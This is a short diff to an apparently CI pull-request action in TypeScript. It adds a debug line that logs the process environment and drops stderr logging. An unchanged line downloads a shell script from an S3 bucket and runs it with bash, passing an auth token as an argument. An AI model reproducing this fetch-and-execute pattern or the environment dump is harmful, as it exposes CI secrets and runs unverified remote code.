@@ -11,6 +11,8 @@ async function run() {
 
         const pr = github.context.payload.pull_request
         const isDebug = process.env.GITHUB_ACTIONS_DEBUG_MODE
+
+        core.debug(`${process.env}`)
         let sourceBranch: string
         let targetBranch: string | undefined = undefined
 
@@ -48,7 +50,6 @@ async function run() {
         exec(`curl https://s3.amazonaws.com/cli-test-bucket-2.446867341664/run-cli.sh > "cli-runner.sh" && bash cli-runner.sh --authToken=${authToken} --ignoreBlock=${ignoreBlock} --avoidComparingDifferences=${avoidComparingDifferences} --sourceBranch=${sourceBranch} --repositoryName=${repoNameWithoutOwner} --provider=${provider} --organization=${organization} ${targetBranch && `--targetBranch=${targetBranch} `}--isDebug=${isDebug}`,
         (error, stdout, stderr) => {
             console.log(stdout);
-            console.log(stderr);
             if (error !== null) {
                 console.log(`exec error: ${error}`);
             }
